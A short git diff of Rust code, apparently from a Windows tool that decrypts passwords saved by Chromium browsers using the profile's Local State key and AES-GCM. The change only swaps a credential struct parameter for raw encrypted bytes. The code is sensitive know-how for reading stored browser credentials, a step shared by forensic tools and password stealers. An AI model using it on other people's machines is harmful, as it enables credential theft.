@@ -15,12 +15,11 @@ use bindings::Windows::Win32::Security::Cryptography::Core::CRYPTOAPI_BLOB;
 use super::browsers::ChromiumBrowser;
 use super::LocalState;
 
-use crate::browsers::Credential;
 use crate::error::{ExtractorError, ExtractorResult};
 
 pub fn decrypt_credential(
     chromium_browser: &ChromiumBrowser,
-    credential: &Credential,
+    encrypted_password: &Vec<u8>,
 ) -> ExtractorResult<String> {
     let mut path = data_local_dir().ok_or(ExtractorError::CannotFindLocalDataDirectory)?;
     path.push(chromium_browser.paths.iter().collect::<PathBuf>());
@@ -70,11 +69,11 @@ pub fn decrypt_credential(
     // https://source.chromium.org/chromium/chromium/src/+/master:components/os_crypt/os_crypt_win.cc;l=30
     //
     // 3 + (96/8) = 15
-    let nonce = GenericArray::from_slice(&credential.encrypted_password[3..15]);
+    let nonce = GenericArray::from_slice(&encrypted_password[3..15]);
 
     Ok(String::from_utf8(
         cipher
-            .decrypt(nonce, &credential.encrypted_password[15..])
+            .decrypt(nonce, &encrypted_password[15..])
             .map_err(|_| ExtractorError::AESGCMCannotDecryptPassword)?,
     )
     .map_err(|_| ExtractorError::AESGCMCannotDecryptPassword)?)
